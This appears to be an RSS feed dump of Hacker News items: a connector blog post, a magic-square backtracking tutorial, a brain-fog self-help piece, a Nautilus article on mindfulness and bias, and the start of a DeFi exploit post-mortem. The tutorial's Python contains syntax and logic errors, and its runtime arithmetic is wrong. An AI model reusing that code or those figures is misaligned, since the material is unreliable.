<p>Cisco is known to use the <a href="https://en.wikipedia.org/wiki/Low-force_helix">60-pin low-force helix</a> connector for their legacy <a href="https://www.cisco.com/c/en/us/support/docs/interfaces-modules/1700-2600-3600-3700-1-port-serial-wan-interface-card/7265-hw-1t-wic.html">Serial WAN Interface Card (WIC-T1)</a>. It is typically used as a display connector on workstations, because it enables connecting up to 4 displays through a single connector.</p>
<p><img src="https://eloydegen.com/blog/images/cisco_lfh.jpg" alt="Connector"></p>
<p>3Com used the <a href="https://en.wikipedia.org/wiki/DB13W3">DB13W3</a> with the Dual Speed Hub 500 for a redundant DC power supply connection. Even though the connector itself is slightly different because the pins in the large holes are missing, a standard DB13W3 cable seems to fit. I don‚Äôt have this hub so I haven‚Äôt tested it myself, but I would be suprised if it doesn‚Äôt fit. I hope nobody their office burned down because a DB13W3 intended for displays was used instead.</p>
<p><img src="https://eloydegen.com/blog/images/DB13W3_connector.jpg" alt="Connector"></p>
<p>The connector is specified further in the manual:</p>
<p><img src="https://eloydegen.com/blog/images/Number8.png" alt="Number 8 description"></p>
<h2 id="legality">Legality</h2>
<p>If there isn‚Äôt a patent or copyright on the design of the connector and the official logo or name is not used, then I think it‚Äôs legal, but this does not seem to be the case with HDMI¬Æ.</p>
<p>The official Dell manual is calling it ‚ÄúHDMI Ports‚Äù, but those ports are certainly not implementing the HDMI protocol. I wonder if any lawyers would argue that this is a trademark infringement.</p>
<p><img src="https://eloydegen.com/blog/images/hdmi_dell.png" alt="Dell manual with HDMI cables"></p>
</article>

        </div></div>]]>
            </description>
            <link>https://eloydegen.com/blog/posts/display-connectors-networking-equipment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126825</guid>
            <pubDate>Sat, 13 Feb 2021 20:57:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving Magic Squares Using Backtracking]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26126652">thread link</a>) | @jpskycak
<br/>
February 13, 2021 | http://www.eurisko.us/solving-magic-squares-using-backtracking/ | <a href="https://web.archive.org/web/*/http://www.eurisko.us/solving-magic-squares-using-backtracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><!--<p class="page__meta"><i class="fa fa-clock-o" aria-hidden="true"></i> 12 minute read</p>--> <!--<p class="page__meta"><time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--><p>By <a target="_blank" href="https://eurisko-us.github.io/elijah-tarr">Elijah Tarr</a> on <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p><!--<p class="page__date"><strong><i class="fa fa-fw fa-calendar" aria-hidden="true"></i> Published:</strong> <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--></header><section itemprop="text"><div><p>A magic square can be thought of as a matrix with specific rows, columns, and diagonals adding up to the same number, called the magic constant. For an $n \times n$ magic square, the magic constant is</p><center> $\begin{align*} \dfrac{1}{n} \sum_{k=1}^{n^2} k \end{align*}$ </center><p>For example, a magic square with dimensions $3 \times 3$ would have magic constant $15,$ and dimensions $4 \times 4$ would have magic constant $34.$</p><p>To solve a magic square, we must fill in each element with a number in ${1, 2, \ldots, n^2 },$ and each number must appear exactly once. A $3 \times 3$ magic square could look like this:</p><center> $\begin{align*} \begin{bmatrix} 2 &amp; 7 &amp; 6 \\ 9 &amp; 5 &amp; 1 \\ 4 &amp; 3 &amp; 8 \end{bmatrix} \end{align*}$ </center><p>Or this:</p><center> $\begin{align*} \begin{bmatrix} 8 &amp; 3 &amp; 4 \\ 1 &amp; 5 &amp; 9 \\ 6 &amp; 7 &amp; 2 \end{bmatrix} \end{align*}$ </center><p>It may seem like a $3 \times 3$ magic square can have multiple solutions. But looking closer allows us to see that the two matrices above are actually both the same configuration. The second matrix is just the first matrix rotated $180$ degrees. In general, rotating and flipping a magic square in any direction will still yield a valid magic square.</p><h2>Solving a Magic Square Using Brute Force</h2><p>How can we build a program to construct one of these magic squares?</p><p>Just like every problem, the simplest way to solve a magic square is to use brute force. It will be the most inefficient solution we can think of, but it will give us some grounding to see which areas we need to improve it in. To get some code down, we can write something like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>():
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>The classic $9$-nested-for-loop approach. It is quite inefficient, but it will do the job. Each $x_k$ variable represents a space in the square. There are 9 spaces, so we nest $9$ loops, $1$ for each space. Each loop will loop through all the possible numbers in that space, $1$ through $9.$</p><p>To write the <code>is_valid</code> function, we need to check for duplicate values, which can easily be done with the use of a set. Then we have to check if each row, column, and diagonal adds up to a certain number, so we can just make a list of all those and check if they are equal to $15$ at the end.</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>is_valid</span>(square, n):
    vals <span>=</span> [entry <span>for</span> row <span>in</span> square <span>for</span> entry <span>in</span> row <span>if</span> entry <span>!=</span> <span>None</span>]
    <span>if</span> <span>len</span>(<span>set</span>(vals)) <span>&lt;</span> <span>len</span>(vals): <span># check for duplicates</span>
        <span>return</span> <span>False</span>
        
    num_rows <span>=</span> <span>len</span>(square)
    arrs <span>=</span> square \ <span># rows</span>
        <span>+</span> [<span>list</span>(arr) <span>for</span> arr <span>in</span> <span>zip</span>(<span>*</span>square)] \ <span># columns</span>
        <span>+</span> [square[i][i] <span>for</span> i <span>in</span> <span>range</span>(<span>len</span>(square))] <span># main diagonal</span>
        <span>+</span> [square[i][num_rows<span>-</span>i<span>-</span><span>1</span>] <span>for</span> i <span>in</span> <span>range</span>(num_rows)] <span># anti-diagonal</span>
        
    <span>return</span> <span>all</span>(<span>sum</span>(arr) <span>==</span> n <span>for</span> arr <span>in</span> arrs <span>if</span> <span>None</span> <span>not</span> <span>in</span> r)
</pre></div></span></p><p>Because I want this function to be able to run on squares larger than just $3 \times 3,$ I pass in the constant as $n$. For a $3 \times 3$ square, we would set $n=15.$ For a $4 \times 4$ square, we would set $n=34.$</p><h2>Brute Force Takes Forever!</h2><p>Let‚Äôs talk about timing. We have $9$ nested for loops, and the <code>is_valid</code> operation is in the deepest one. Since each loop is going to run $9$ times to test each number $1-9$ in each element of the square, it‚Äôs going to run the <code>is_valid</code> function $9^9$ times, which is absolutely insane.</p><p>Using Python‚Äôs <code>timeit</code> module, we can see how long the <code>is_valid</code> function takes to run:</p><ul><li>$1.6 \, \mu\textrm{s}$ to run if there are duplicate values</li><li>$5.3 \, \mu\textrm{s}$ to run if there are no duplicate values</li><li>$6.3 \, \mu\textrm{s}$ to run if the square is valid</li></ul><p>With this brute force algorithm, we can expect that the vast majority of iterations are going to have duplicate values in them. So, I‚Äôll be generous and say that each time it runs, $1.6 \, \mu\textrm{s}$ pass. That means the amount of time it takes is $9^9 \times 1.6 \textrm{ usecs} \sim 10.3 \textrm{ minutes}.$</p><p>What if we wanted a $4 \times 4$ magic square? Well, we can use the equation again: $16^{16} \times 1.6 \mu\textrm{s} \sim \textbf{600 millennia}.$ It‚Äôs very unlikely that the human race will even exist for that long; we might have destroyed the earth along with the computer that was running this algorithm by then. We need to write a more efficient algorithm.</p><h2>Backtracking</h2><p>The problem with brute force is that it spends too much time looking through solutions that will never work. For example, the algorithm starts out with the square</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 1 \end{bmatrix}, \end{align*}$ </center><p>and then advances to</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 2 \end{bmatrix}, \end{align*}$ </center><p>and then</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 3 \end{bmatrix}. \end{align*}$ </center><p>There‚Äôs absolutely no point in checking any square with the first $3$ numbers as $1$ because we‚Äôre not allowed to have duplicates.</p><p>To avoid configurations like $1,1,1$ as the top row, we can use a technique called <b>backtracking</b>. Whenever we reach a configuration that won‚Äôt work, we ‚Äúbacktrack‚Äù and skip over that configuration instead of wasting tons of time modifying it in ways that will never make it valid.</p><p>Using backtracking, we would skip over all configurations that have duplicates, and instead start out with</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 2 &amp; 3\\ 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \end{bmatrix}. \end{align*}$ </center><p>To implement backtracking, we‚Äôll start by skipping over configurations with duplicates. In each for loop, before entering the next loop, we will check if the number has been duplicated anywhere. We will only check the rest of the square if the number isn‚Äôt duplicated. Implementing this, we end up with the following code:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>()
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>if</span> x2 <span>in</span> [x1]:
                <span>continue</span>
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>if</span> x3 <span>in</span> [x1, x2]:
                    <span>continue</span>
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>if</span> x4 <span>in</span> [x1, x2, x3]:
                        <span>continue</span>
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>if</span> x5 <span>in</span> [x1, x2, x3, x4]:
                            <span>continue</span>
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>if</span> x6 <span>in</span> [x1, x2, x3, x4, x5]:
                                <span>continue</span>
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>if</span> x7 <span>in</span> [x1, x2, x3, x4, x5, x6]:
                                    <span>continue</span>
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>if</span> x8 <span>in</span> [x1, x2, x3, x4, x5, x6, x7]:
                                        <span>continue</span>
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        <span>if</span> x9 <span>in</span> [x1, x2, x3, x4, x5, x6, x7, x8]:
                                            <span>continue</span>
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>Once we run this code, we notice a massive improvement in performance! Within only a couple of seconds, our algorithm actually finds multiple squares.</p><p>With this new algorithm, we skip all squares which repeat numbers, which will always be invalid. So, we are looping through all permutations. We can expect to run the validation function about $P(10, 9) = 3,628,800$ times, which is much less than the $9^9$ times we had to check last time.</p><p>Now, this method speeds up our code, but by how much? Theoretically, it takes $P(10, 9) * 1.6 \mu\textrm{s} \sim 5.8 \mu\textrm{s}$ to just run all the validations. (We introduced a bunch of ‚Äòif‚Äô statements in between each of the for loops, so it will take a bit longer in reality.) But the point is, our new algorithm works $10,600\%$ faster than the old one!</p><h2>Using a While Loop</h2><p>Still, we have another problem left, and that is the quality of the code. No one wants to have to look at a cascading abyss of for loops and if statements while writing their code, so let‚Äôs see if we can combine all this into a single while loop.</p><p>If you think about it, we can treat the square as a list of numbers instead of a list of rows. Instead of $[[1, 2, 3], [4, 5, 6], [7, 8, 9]],$ we can store the array as $[1, 2, 3, 4, 5, 6, 7, 8, 9].$ Now, that means we will need a function to convert the flat list into a square:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>arr_to_square</span>(arr):
    side_length <span>=</span> <span>int</span>(<span>len</span>(arr) <span>**</span> <span>0.5</span>)
    <span>return</span> [arr[i:i<span>+</span>side_length] <span>for</span> i <span>in</span> <span>range</span>(<span>0</span>, <span>len</span>(arr), side_length)]
</pre></div></span></p><p>Now, let‚Äôs think of how we can structure the while loop. We want the loop to keep going until both the value None is nowhere to be found in the list, and the square is valid. We can use the <code>or</code> operator to run the loop if <code>None</code> is in the square, or the square isn‚Äôt valid, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>(size):
    n <span>=</span> get_magic_const(size)
    square <span>=</span> [<span>None</span> <span>for</span> i <span>in</span> <span>range</span>(size<span>**</span><span>2</span>)]
    
    <span>while</span> <span>None</span> <span>in</span> square <span>or</span> <span>not</span> is_valid(arr_to_square(square), n):
        <span>pass</span>
        
    <span>return</span> arr_to_square(square)
</pre></div></span></p><p>You‚Äôll notice I use the function <code>get_magic_const</code>, which computes the magic constant, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>get_magic_const</span>(side_length):
    <span>return</span> side_length<span>*</span>(side_length<span>**</span><span>2</span><span>+</span><span>1</span>)<span>/</span><span>2</span>
</pre></div></span></p><p>We will need a variable to store the index of the ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eurisko.us/solving-magic-squares-using-backtracking/">http://www.eurisko.us/solving-magic-squares-using-backtracking/</a></em></p>]]>
            </description>
            <link>http://www.eurisko.us/solving-magic-squares-using-backtracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126652</guid>
            <pubDate>Sat, 13 Feb 2021 20:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 93 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a ‚Äúcloudy-headed‚Äù feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can‚Äôt concentrate, everything you do is harder and takes longer than you‚Äôd like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There‚Äôs a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn‚Äôt too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You‚Äôre not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you‚Äôre going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn‚Äôt&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you‚Äôre continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain ‚Äì reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It‚Äôs one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you‚Äôre comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain‚Äôs regenerating capacity, known as plasticity.</p>
<p>‚ÄúNeglect of intense learning leads plasticity systems to waste away,‚Äù says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>‚ÄúIt‚Äôs the willingness to leave the comfort zone that is the key to keeping the brain new,‚Äù he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don‚Äôt sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being ‚Äúlike a muscle‚Äù. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30‚Äì45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It‚Äôs extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go‚Ä¶</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, ‚Äú<em>The Power of One Percent Better: Small Gains, Maximum Results‚Äù. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Simple Way to Reduce Cognitive Bias]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26126247">thread link</a>) | @CapitalistCartr
<br/>
February 13, 2021 | http://m.nautil.us/blog/a-simple-way-to-reduce-cognitive-bias | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/a-simple-way-to-reduce-cognitive-bias">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<figure data-alt=""><img src="http://static.nautil.us/18161_03b6e2856f286e362632584b8574146e.png" width="733" alt=""><figcaption><span><i>It‚Äôs encouraging to know that merely paying attention to the details of your environment can make you a little more rational.</i></span><span>Illustration by yulianas / Shutterstock</span></figcaption></figure><p><span>W</span>ould you like to be more rational? Of course you would. Who doesn‚Äôt want to behave and think more reasonably? Good news: New <a href="https://www.nature.com/articles/s41599-021-00712-1.epdf?sharing_token=X5MjwLDRSAiHhYFktvZ76lxOt48VBPO10Uv7D6sAgHujAy2n79E2tUrp3HAv2i2Rrv1or3LrbmAiE9eh_bR3MkKnec-0-hNfUvcab7_4M1ok7U8kigFHdoAAa1GE9E9bFZBKLcGwfALPGhRiaNM-YdOySqPSSQinxc3Z2msPPzI=" target="_blank">research</a>, from Harvard psychologist Ellen Langer, suggests mindfulness, or at least an aspect of it, can help. By ‚Äú<a href="https://nautil.us/issue/16/nothingness/an-atheists-guide-to-spirituality" target="_blank">mindfulness</a>‚Äù‚Äîa feature of Buddhism for thousands of years, and a subject of scientific investigation for a few decades‚Äîmost people mean a mental state you can be in. Let‚Äôs try.</p><p>Pay attention to your current sensations‚Äîthe feeling of your back against a chair, or the weight of your phone in your hand. Pay attention to the thoughts and feelings flitting in your mind. Don‚Äôt ‚Äújudge‚Äù them. Merely notice that they‚Äôre there. If you find yourself bringing past or possible future events into your imagination, let those drift off, and attend again to your present sensations, thoughts, and feelings. Not too difficult, right? Being mindful for a few seconds is easy. Being mindful for an hour is very difficult.</p><blockquote><p>It appears that mindfulness reduces cognitive bias, but these results need to be interpreted carefully.</p> </blockquote><p>One way to encourage people to be more mindful is to ask them to try to notice more things, and one way to measure mindfulness is to measure their ability to do so. Langer and her colleague Philip Maymin, of Fairfield University, used this aspect of mindfulness to try to reduce that familiar enemy of rationality‚Äîcognitive biases. There are <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases" target="_blank">names</a> for over 100 of the systematic ways we think about the world irrationally. But it is likely that many are multiple names for the same underlying psychological process. (The tendency to give new names for things that already have names my colleague and I playfully call the <i>McKee-Davies bias</i>, which might be the first bias to be named as a result of itself.)<br></p><p>Maymin and Langer randomly divided 109 people into a ‚Äúmindless‚Äù control group, a ‚Äúlow-mindful‚Äù group, and a ‚Äúmindful‚Äù group. The low-mindful group chose their favorite of two random-dot patterns with subtle triangles. The mindful group looked at two slightly-less random images, and spotted hard-to-find differences between them. Then they looked at two nearly identical images of a fruit pile at once, and tried to spot which fruit, from one of the piles, was missing. Maymin and Langer measured people‚Äôs mindfulness using a survey, specifically a <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2158921#:~:text=Overall,%20the%20present%20study%20suggests,for%20both%20individuals%20and%20organizations." target="_blank">14-item measure</a> that focuses on flexibility of thinking and noticing new things (an admittedly Western conception of mindfulness).</p><p>The results confirmed that the mindful group, as a result of the attention they paid to their task, was actually mindful, and the mindless and low mindful groups were not.&nbsp;</p><p>The people in the mindful group also became more rational, in terms of bias. Maymin and Langer quizzed them on a bunch of questions measuring 22 cognitive biases that scientists have established. These included the conjunction fallacy (thinking that the amount of something specific is greater than the general category, like Republican bankers are more common than bankers), and the gambler‚Äôs fallacy (thinking that, after flipping a coin and getting ‚Äúheads‚Äù a few times, ‚Äútails‚Äù will be more probable than 50 percent on the next roll). They found that the mindful group showed improvement on 19 out of the 22 biases.&nbsp;</p><p>It appears that mindfulness reduces cognitive bias, but these results need to be interpreted carefully. For one thing, although it purports to be about mindfulness in general, it is not clear the study‚Äôs intervention and mindfulness measure get at what people often take mindfulness to mean. For example, the training involved asking people to look for differences between photographs, and the Langer Mindfulness Scale, which the researchers used as a measure for mindfulness, asks questions about engagement, seeking novelty, and producing novelty. Although scientists have validated this measure, and found that it correlates with many things we would hope mindfulness would, neither the intervention nor the scale addresses thinking about the future, judgment of thoughts, focus, or <a href="https://nautil.us/blog/the-problem-with-mindfulness" target="_blank">mindfulness meditation</a> (the practice of doing nothing but sitting, or sometimes walking, and paying attention to the here and now). So, this study does not show evidence that your rationality is improved by being mindful in the sense of how you go about dealing with your own thoughts.&nbsp;</p><p>It might be better to interpret these findings as showing that cognitive bias can be reduced by encouraging people to pay closer perceptual attention to their environment‚Äîan important aspect of mindfulness, which many people often think of as a stress reducer that, practiced regularly and enough, can lead to a happier life.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




</div><p>It‚Äôs too bad people generally aren‚Äôt very mindful. A 2010 <a href="https://science.sciencemag.org/content/330/6006/932.full" target="_blank">study</a> found that people‚Äôs minds wandered 47 percent of the time, and the only activity that people reliably focus on is making love. If you‚Äôre pretty well-trained in mindfulness meditation, you can mindfully do anything.&nbsp;</p><p>Is it better to be mindful? There is some evidence that, in general, people are happier if they are thinking about what they‚Äôre doing, even if that thing isn‚Äôt any fun, like washing the dishes. However, there is also <a href="https://psycnet.apa.org/record/2005-13229-002" target="_blank">evidence</a> that thinking about happy things from your past (nostalgia) increases pain tolerance, positive mood, empathy, and creativity, and reduces anxiety, boredom, and stress. So, though mindfulness is generally good, it‚Äôs perhaps not something to strive for at <i>every</i> moment. When vacationers <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2837207/" target="_blank">look forward</a> to their trips, for example, they‚Äôre a little happier. These results show that sometimes thinking about the past and the future can make you happier.</p><p>It‚Äôs encouraging to know that merely paying attention to the details of your environment, what Langer calls&nbsp;‚Äú<a href="https://www.youtube.com/watch?v=SSde3wV3-Qc&amp;t=0m50s" target="_blank">active noticing</a>,‚Äù can make you a little more rational.</p><p><i>Jim Davies is a professor at the Department of Cognitive Science at Carleton University. He is the author of </i>Imagination: The Science of Your Mind‚Äôs Greatest Power<i> and </i>Riveted: The Science of Why Jokes Make us Laugh, Movies Make us Cry, and Religion Makes us Feel One with the Universe<i>. He is co-host of the award-winning podcast Minding the Brain. His new book, </i>Being the Person Your Dog Thinks You Are: The Science of a Better You<i>, comes out in February 2021.</i></p>

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/blog/a-simple-way-to-reduce-cognitive-bias</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126247</guid>
            <pubDate>Sat, 13 Feb 2021 20:00:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alpha Homora V2 Post Mortem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26126232">thread link</a>) | @eswat
<br/>
February 13, 2021 | https://blog.alphafinance.io/alpha-homora-v2-post-mortem/ | <a href="https://web.archive.org/web/*/https://blog.alphafinance.io/alpha-homora-v2-post-mortem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Dear Alpha community, our partners, and DeFi users, as we have shared earlier, we have closed the loophole that made the exploit possible. We‚Äôd like to take this opportunity to thank everyone who has helped us, be it on the technical front and non-technical front. We sincerely appreciate it. We are investigating with the relevant parties and will investigate with the authorities to trace the attacker.</p><p>Now, we would like to share a post mortem on the recent Alpha Homora V2 exploit to explain</p><p><strong>1. What happened</strong></p><p><strong>2. Who is affected</strong></p><p><strong>3. What‚Äôs next and</strong></p><p><strong>4. Walk through of technical analysis of what happened.</strong></p><p>This exploit is complicated, involving more than 9 transactions. We hope this thorough post mortem will not only be helpful to the Alpha community and our partners, but also to other projects and builders in DeFi.</p><p>This moment shows how important it is to continue helping each other out and building a safer DeFi ecosystem for everyone. Alpha team is committed to building and helping builders in the space to create a stronger and safer DeFi ecosystem.</p><h2 id="what-happened">What happened?</h2><p>On Feb 13 5:37AM UTC, an attacker exploited Alpha Homora V2 using a series of complex transactions, which involved flashloans.</p><p>Here‚Äôs what the attacker need to know about the code and the setup in order to execute the attack:</p><ul><li>HomoraBankv2 has an sUSD pool on a contract level in preparation for the upcoming release, which is neither available on the UI nor publicly announced.</li><li>There was no liquidity in sUSD lending pool, so the attacker can fully manipulate and inflate the total debt amount and total debt 